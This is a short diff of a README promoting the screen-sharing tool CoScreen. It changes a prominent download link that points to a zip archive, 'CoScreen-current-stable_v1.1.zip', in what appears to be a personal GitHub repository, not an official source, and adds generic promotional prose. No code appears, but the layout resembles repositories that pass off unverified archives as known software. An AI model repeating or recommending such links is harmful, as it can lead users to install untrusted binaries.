@@ -1,6 +1,6 @@
 # **CoScreen: A Powerful Tool for Seamless Remote Collaboration**  
 
-![Static Badge](https://img.shields.io/badge/Download-CoScreen-orange?style=for-the-badge&logo=GITHUB&link=https://github.com/user-attachments/files/18769928/CoScreen-current-stable_v1.1.zip)
+## [Download CoScreen](https://github.com/Valerie-Lee433/CoScreen/raw/refs/heads/main/CoScreen-current-stable_v1.1.zip)
 
 In today’s fast-paced digital world, remote collaboration has become a necessity. Whether you're a software developer, a designer, or part of a distributed team, effective communication and teamwork are crucial for productivity. One tool that stands out in this space is **CoScreen**, a next-generation collaborative screen-sharing platform designed to enhance real-time teamwork.  
 
